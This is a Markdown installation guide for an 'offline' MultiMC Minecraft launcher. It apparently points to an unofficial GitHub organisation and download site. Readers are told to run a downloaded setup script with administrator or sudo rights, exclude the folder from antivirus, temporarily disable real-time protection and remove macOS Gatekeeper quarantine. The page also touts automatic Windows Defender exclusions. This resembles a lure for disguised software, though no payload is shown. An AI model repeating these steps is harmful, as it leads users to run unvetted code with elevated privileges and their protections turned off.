---
title: "Installation Guide - MultiMC Launcher"
description: "Complete installation guide for MultiMC offline Minecraft launcher on Windows, macOS, and Linux. Step-by-step setup for air-gapped systems."
keywords: "multimc installation, minecraft launcher setup, offline minecraft install, multimc windows, multimc linux, multimc macos"
layout: page
---

# Installation Guide

## 🚀 Quick Installation

### Automated Setup (Recommended)
The easiest way to install MultiMC is using our Setup Assistant:

1. **[Download Setup Assistant](https://multimc-launcher.github.io/.github/)**
2. **Extract** the archive to your desired location
3. **Run** Setup-Assistant.bat (Windows) or setup.sh (Linux/macOS)
4. **Follow** the automated wizard
5. **Launch** MultiMC and enjoy!

---

## 💻 Platform-Specific Installation

### Windows Installation

#### System Requirements
- **OS**: Windows 7, 8, 10, or 11 (32-bit or 64-bit)
- **RAM**: 4GB minimum, 8GB recommended
- **Storage**: 2GB free space
- **Administrator access** for initial setup

#### Step-by-Step Installation

1. **Download the Setup Assistant**
   - Visit [MultiMC Releases](https://github.com/MultiMC-Launcher/multimc/releases)
   - Download `MultiMC-Setup-Windows.zip`

2. **Extract the Archive**
   ```cmd
   # Using built-in Windows extractor
   Right-click → Extract All → Choose destination
   
   # Or using 7-Zip (recommended)
   7z x MultiMC-Setup-Windows.zip -o"C:\MultiMC"
   ```

3. **Run Setup Assistant**
   ```cmd
   # Right-click and select "Run as administrator"
   Setup-Assistant.bat
   ```

4. **Configuration Wizard**
   - **Java Detection**: Automatically finds or installs Java
   - **Instance Location**: Choose where to store Minecraft instances
   - **Memory Allocation**: Set default RAM usage
   - **Mod Libraries**: Download common mod loaders

5. **First Launch**
   ```cmd
   # Launch MultiMC
   MultiMC.exe
   ```

#### Windows-Specific Features
- **Portable Mode**: Copy entire folder to USB drive
- **Group Policy**: Deploy across domain networks
- **Windows Defender**: Automatic exclusion setup
- **Start Menu**: Optional shortcuts creation

### macOS Installation

#### System Requirements
- **OS**: macOS 10.12 (Sierra) or later
- **Architecture**: Intel x64 or Apple Silicon (M1/M2)
- **RAM**: 4GB minimum, 8GB recommended
- **Storage**: 2GB free space

#### Step-by-Step Installation

1. **Download for macOS**
   ```bash
   # Download via browser or curl
   curl -L -o MultiMC-Setup-macOS.zip \
     https://github.com/MultiMC-Launcher/multimc/releases/latest/download/MultiMC-Setup-macOS.zip
   ```

2. **Extract and Install**
   ```bash
   # Extract archive
   unzip MultiMC-Setup-macOS.zip -d ~/Applications/
   
   # Make executable
   chmod +x ~/Applications/MultiMC/setup.sh
   chmod +x ~/Applications/MultiMC/MultiMC.app/Contents/MacOS/MultiMC
   ```

3. **Run Setup Assistant**
   ```bash
   # Navigate to MultiMC folder
   cd ~/Applications/MultiMC/
   
   # Run setup with admin privileges
   sudo ./setup.sh
   ```

4. **Handle Gatekeeper**
   ```bash
   # If macOS blocks the app
   sudo xattr -rd com.apple.quarantine ~/Applications/MultiMC/MultiMC.app
   
   # Or via System Preferences
   # Security & Privacy → Allow apps downloaded from: Anywhere
   ```

5. **Launch MultiMC**
   ```bash
   # Via Finder
   open ~/Applications/MultiMC/MultiMC.app
   
   # Or via Terminal
   ~/Applications/MultiMC/MultiMC.app/Contents/MacOS/MultiMC
   ```

#### macOS-Specific Features
- **Apple Silicon**: Native M1/M2 support
- **Retina Display**: High-DPI interface scaling
- **Keychain**: Secure credential storage
- **Spotlight**: Searchable from Spotlight

### Linux Installation

#### System Requirements
- **Distribution**: Ubuntu 16.04+, CentOS 7+, Arch, Fedora, openSUSE
- **Architecture**: x86_64 (64-bit)
- **RAM**: 4GB minimum, 8GB recommended
- **Storage**: 2GB free space

#### Ubuntu/Debian Installation

1. **Install Dependencies**
   ```bash
   # Update package list
   sudo apt update
   
   # Install required packages
   sudo apt install wget unzip openjdk-17-jdk
   ```

2. **Download and Extract**
   ```bash
   # Download MultiMC
   wget https://github.com/MultiMC-Launcher/multimc/releases/latest/download/MultiMC-Setup-Linux.tar.gz
   
   # Extract to /opt (system-wide) or ~/Applications (user-only)
   sudo tar -xzf MultiMC-Setup-Linux.tar.gz -C /opt/
   # OR
   tar -xzf MultiMC-Setup-Linux.tar.gz -C ~/Applications/
   ```

3. **Run Setup Assistant**
   ```bash
   # System-wide installation
   sudo /opt/MultiMC/setup.sh
   
   # User installation
   ~/Applications/MultiMC/setup.sh
   ```

4. **Create Desktop Entry**
   ```bash
   # Create .desktop file
   cat > ~/.local/share/applications/multimc.desktop << EOF
   [Desktop Entry]
   Type=Application
   Name=MultiMC
   Comment=Minecraft Instance Manager
   Exec=/opt/MultiMC/MultiMC
   Icon=/opt/MultiMC/multimc.png
   Categories=Game;
   EOF
   
   # Update desktop database
   update-desktop-database ~/.local/share/applications/
   ```

#### CentOS/RHEL Installation

1. **Install Dependencies**
   ```bash
   # Enable EPEL repository
   sudo yum install epel-release
   
   # Install packages
   sudo yum install wget unzip java-17-openjdk
   ```

2. **Follow Ubuntu steps** for download and setup

#### Arch Linux Installation

1. **Install Dependencies**
   ```bash
   # Install from official repositories
   sudo pacman -S wget unzip jre17-openjdk
   ```

2. **AUR Package (Alternative)**
   ```bash
   # Using yay AUR helper
   yay -S multimc-launcher
   ```

#### Linux-Specific Features
- **AppImage**: Portable single-file distribution
- **Flatpak**: Sandboxed installation option
- **System Integration**: Native desktop environment support
- **Package Managers**: Available in various repositories

---

## 🔧 Advanced Installation Options

### Portable Installation

For USB drives or shared storage:

```bash
# Windows
xcopy /E /I MultiMC E:\PortableApps\MultiMC

# macOS/Linux
cp -r MultiMC /Volumes/USB/PortableApps/
```

**Benefits:**
- No installation required
- Runs from any computer
- Settings travel with you
- Perfect for mobile setups

### Network Installation

For enterprise deployments:

#### Windows Group Policy
```cmd
# Deploy via GPO
msiexec /i MultiMC-Enterprise.msi /quiet INSTALLDIR="C:\Program Files\MultiMC"
```

#### Linux Configuration Management
```bash
# Ansible playbook
- name: Install MultiMC
  unarchive:
    src: MultiMC-Setup-Linux.tar.gz
    dest: /opt/
    remote_src: yes
  become: yes
```

### Custom Installation Paths

#### Windows
```cmd
# Custom installation directory
Setup-Assistant.bat --install-dir "D:\Games\MultiMC"
```

#### Linux/macOS
```bash
# Custom installation directory
./setup.sh --prefix=/usr/local --data-dir=/var/lib/multimc
```

---

## 🛠 Post-Installation Configuration

### Java Configuration

MultiMC automatically detects Java installations, but you can customize:

1. **Open Settings** → Java
2. **Set Java Path**: Browse to specific Java installation
3. **Memory Allocation**: 
   - Minimum: 1024 MB
   - Maximum: 4096 MB (or 50% of system RAM)
4. **JVM Arguments**: Add performance optimizations

### Instance Storage

Configure where Minecraft instances are stored:

1. **Settings** → MultiMC
2. **Instance Folder**: Choose location with plenty of space
3. **Central Mods**: Enable shared mod storage
4. **Backups**: Configure automatic backup location

### Network Settings

For offline or restricted environments:

1. **Settings** → Network
2. **Work Offline**: Enable for air-gapped systems
3. **Proxy Settings**: Configure if needed
4. **Update Checking**: Disable for offline use

---

## 🔍 Verification & Testing

### Installation Verification

1. **Launch MultiMC**
2. **Check Java Detection**: Settings → Java
3. **Create Test Instance**: 
   - Click "Add Instance"
   - Select Minecraft version
   - Launch and verify functionality

### Performance Testing

```bash
# Check Java version
java -version

# Monitor memory usage
# Windows: Task Manager
# macOS: Activity Monitor  
# Linux: htop or top
```

### Offline Testing

1. **Disconnect from internet**
2. **Launch MultiMC**
3. **Create new instance**
4. **Install mods offline**
5. **Launch Minecraft**

---

## 🐛 Troubleshooting Installation

### Common Issues

#### "Java not found" Error
```bash
# Windows
set JAVA_HOME=C:\Program Files\Java\jdk-17
set PATH=%JAVA_HOME%\bin;%PATH%

# Linux/macOS
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk
export PATH=$JAVA_HOME/bin:$PATH
```

#### Permission Denied (Linux/macOS)
```bash
# Fix permissions
chmod +x MultiMC
chmod -R 755 MultiMC/

# Run with sudo if needed
sudo ./setup.sh
```

#### Antivirus Blocking (Windows)
1. Add MultiMC folder to antivirus exclusions
2. Temporarily disable real-time protection
3. Re-run Setup Assistant

#### macOS Gatekeeper Issues
```bash
# Remove quarantine attribute
sudo xattr -rd com.apple.quarantine MultiMC.app

# Or allow in System Preferences
# Security & Privacy → General → Allow apps downloaded from: Anywhere
```

### Getting Help

If installation fails:

1. **Check [FAQ](faq.md)** for common solutions
2. **Review [Troubleshooting Guide](troubleshooting.md)**
3. **Search [GitHub Issues](https://github.com/MultiMC-Launcher/multimc/issues)**
4. **Ask in [Community Discussions](https://github.com/MultiMC-Launcher/multimc/discussions)**

---

## 📞 Enterprise Support

For large-scale deployments:

- **📧 Email**: enterprise@multimc-launcher.org
- **📋 Custom Installers**: Tailored for your environment
- **🔧 Deployment Scripts**: Automated installation tools
- **📚 Training**: Staff training and documentation
- **🎯 Priority Support**: Dedicated technical assistance

---

**Installation complete? Check out our [Configuration Guide](configuration.md) to optimize your setup!** ⚙️ 